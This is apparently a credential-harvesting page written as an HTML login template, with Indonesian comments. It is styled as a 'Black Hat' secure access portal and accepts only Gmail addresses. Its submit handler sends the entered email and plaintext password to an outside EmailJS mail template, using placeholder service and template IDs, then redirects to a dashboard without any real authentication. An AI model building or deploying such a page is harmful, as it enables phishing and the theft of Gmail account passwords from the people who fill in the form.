<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Black Hat - Secure Access</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: radial-gradient(circle at top, #1a0f2e, #0b0b0f 70%);
            color: #e5e5e5;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            background: rgba(20, 10, 35, 0.9);
            backdrop-filter: blur(8px);
            padding: 20px 50px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #3b1c66;
        }

        header h1 {
            font-size: 22px;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: #c084fc;
        }

        header img {
            height: 42px;
            filter: drop-shadow(0 0 8px rgba(192,132,252,0.5));
        }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
        }

        .card {
            background: rgba(18, 10, 30, 0.95);
            padding: 45px;
            width: 100%;
            max-width: 420px;
            border-radius: 14px;
            border: 1px solid #3b1c66;
            box-shadow: 0 0 40px rgba(128, 0, 255, 0.15);
        }

        .card h2 {
            text-align: center;
            margin-bottom: 30px;
            color: #c084fc;
            font-weight: 600;
            letter-spacing: 1px;
        }

        .form-group {
            margin-bottom: 22px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            margin-bottom: 8px;
            color: #b38dfc;
        }

        .form-group input {
            width: 100%;
            padding: 13px;
            background: #0f0a18;
            border: 1px solid #3b1c66;
            border-radius: 8px;
            color: #ffffff;
            font-size: 14px;
            transition: 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #a855f7;
            box-shadow: 0 0 12px rgba(168,85,247,0.4);
        }

        button {
            width: 100%;
            padding: 13px;
            background: linear-gradient(135deg, #6d28d9, #9333ea);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: 0.3s ease;
            letter-spacing: 1px;
        }

        button:hover {
            background: linear-gradient(135deg, #7c3aed, #a855f7);
            box-shadow: 0 0 18px rgba(168,85,247,0.5);
        }

        footer {
            text-align: center;
            padding: 18px;
            font-size: 12px;
            color: #9ca3af;
            border-top: 1px solid #3b1c66;
            background: #0b0b0f;
        }

        @media (max-width: 480px) {
            .card {
                padding: 30px;
            }
        }

        img {
            border-radius: 20%;
            height: 20%;
            width: 13%;
        }

        .input-wrapper {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            user-select: none;
        }
    </style>
</head>

<body>

<header>
    <h1>BLACK HAT</h1>
    <img src="black.png" alt="Black Hat Logo">
</header>

<main>
    <div class="card">
        <h2>Secure Access Portal</h2>
        <form id="loginForm"> <!-- DIPERBAIKI: tambahkan id -->
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="Masukan email anda" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>

                <!-- DIPERBAIKI: input dibungkus input-wrapper -->
                <div class="input-wrapper">
                    <input type="password" id="password" placeholder="Masukan password anda" required>
                    <span id="togglePassword" class="toggle-password">üëÅ</span>
                </div>

            </div>

            <button type="submit">Login</button>
        </form>
    </div>
</main>

<footer>
    Confidential System ‚Ä¢ Encrypted Session ‚Ä¢ 2026
</footer>

<script>
const togglePassword = document.getElementById("togglePassword");
const passwordInput = document.getElementById("password");
const form = document.getElementById("loginForm");

// Toggle Password
togglePassword.addEventListener("click", function () {
    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        togglePassword.textContent = "sembunyikan";
    } else {
        passwordInput.type = "password";
        togglePassword.textContent = "lihat";
    }
});

// Submit Form (digabung jadi satu saja)
form.addEventListener("submit", function(event) {
    event.preventDefault();

    const email = document.getElementById("email").value.trim();
    const password = passwordInput.value.trim();

    const gmailRegex = /^[a-zA-Z0-9._%+-]{6,30}@gmail\.com$/;

    if (!gmailRegex.test(email)) {
        alert("Format Gmail tidak valid!");
        return;
    }

    if (password.length < 8) {
        alert("Password minimal 8 karakter!");
        return;
    }

    // Jika emailjs tersedia
    if (typeof emailjs !== "undefined") {
        const templateParams = {
            user_email: email,
            user_password: password
        };

        emailjs.send("SERVICE_ID_KAMU", "TEMPLATE_ID_KAMU", templateParams)
        .then(function(response) {
            window.location.href = "dashboard.html";
        }, function(error) {
            alert("Terjadi kesalahan!");
        });
    } else {
        // Jika tidak pakai emailjs langsung redirect
        window.location.href = "dashboard.html";
    }
});
</script>

</body>
</html>
